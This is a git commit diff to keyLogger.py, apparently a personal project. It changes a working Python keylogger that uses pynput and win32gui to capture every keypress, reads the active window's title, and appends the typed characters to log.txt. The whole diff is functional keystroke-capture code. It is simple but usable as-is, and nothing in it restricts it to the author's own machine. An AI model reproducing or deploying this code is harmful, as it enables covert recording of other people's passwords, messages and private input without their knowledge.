52d450e3537d7eb2364fc67bc28a5fd57ef6a374
Darlan <darlaneduardoguimaraes@gmail.com>
2023-04-04 20:55:27 -0300

    logger is true

--- keyLogger.py
+++ keyLogger.py
@@ -4,19 +4,25 @@ import win32gui
 numeros = [str(i) for i in range(10)]
 letras_min = [chr(i) for i in range(ord('a'), ord('z')+1)]
 letras_mai = [chr(i) for i in range(ord('A'), ord('Z')+1)]
-
+alf = []
 alf_comp = numeros + letras_min + letras_mai
+for i in alf_comp:
+    i = i.replace("'", "")
+    alf.append(i)
+
+
 def on_press(key):
     hwnd = win32gui.GetForegroundWindow()
     win_title = win32gui.GetWindowText(hwnd)
     key = str(key)
+    key = key.replace("'", "")
+    print(key)
     with open("log.txt", "a") as f:
-        print(key)
-        key = key.replace("'", "")
-        if(key in alf_comp):
+        if key in alf:
             f.write(key)
         else:
-            f.write(key + "\n")
+            f.write("\n" + key + "\n")
 
 with Listener(on_press=on_press) as listener:
     listener.join()
+
